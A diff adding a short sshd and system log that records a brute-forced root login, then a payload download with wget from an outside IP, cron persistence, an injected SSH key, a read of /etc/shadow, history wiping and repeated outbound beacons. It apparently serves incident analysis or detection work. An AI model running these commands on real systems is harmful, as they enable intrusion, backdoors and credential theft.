@@ -1,0 +1,19 @@
+Jul 23 02:14:33 web-01 sshd[28401]: Failed password for root from 185.220.101.34 port 44832 ssh2
+Jul 23 02:14:35 web-01 sshd[28403]: Failed password for root from 185.220.101.34 port 44836 ssh2
+Jul 23 02:14:36 web-01 sshd[28405]: Failed password for admin from 185.220.101.34 port 44840 ssh2
+Jul 23 02:14:38 web-01 sshd[28409]: Failed password for ubuntu from 185.220.101.34 port 44848 ssh2
+Jul 23 02:14:40 web-01 sshd[28412]: Invalid user oracle from 185.220.101.34 port 44854
+Jul 23 02:14:41 web-01 sshd[28413]: Accepted password for root from 185.220.101.34 port 44856 ssh2
+Jul 23 02:15:01 web-01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://91.215.85.142/loader.sh
+Jul 23 02:15:03 web-01 bash[28450]: running /tmp/loader.sh stage2
+Jul 23 02:15:05 web-01 kernel: [UFW BLOCK] SRC=185.220.101.34 DST=10.0.1.15 PROTO=TCP DPT=4444
+Jul 23 02:15:08 web-01 crontab[28455]: (root) REPLACE (root) - added /tmp/.hidden/persist.sh
+Jul 23 02:15:09 web-01 bash[28460]: echo ssh-rsa AAAAB3N >> /root/.ssh/authorized_keys
+Jul 23 02:15:22 web-01 bash[28470]: cat /etc/shadow
+Jul 23 02:15:40 web-01 bash[28480]: history -c
+Jul 23 02:16:00 web-01 kernel: [UFW ALLOW] SRC=10.0.1.15 DST=91.215.85.142 PROTO=TCP DPT=443
+Jul 23 02:17:00 web-01 kernel: [UFW ALLOW] SRC=10.0.1.15 DST=91.215.85.142 PROTO=TCP DPT=443
+Jul 23 02:18:00 web-01 kernel: [UFW ALLOW] SRC=10.0.1.15 DST=91.215.85.142 PROTO=TCP DPT=443
+Jul 23 02:19:00 web-01 kernel: [UFW ALLOW] SRC=10.0.1.15 DST=91.215.85.142 PROTO=TCP DPT=443
+Jul 23 02:20:00 web-01 kernel: [UFW ALLOW] SRC=10.0.1.15 DST=91.215.85.142 PROTO=TCP DPT=443
+Jul 23 02:21:00 web-01 kernel: [UFW ALLOW] SRC=10.0.1.15 DST=91.215.85.142 PROTO=TCP DPT=443
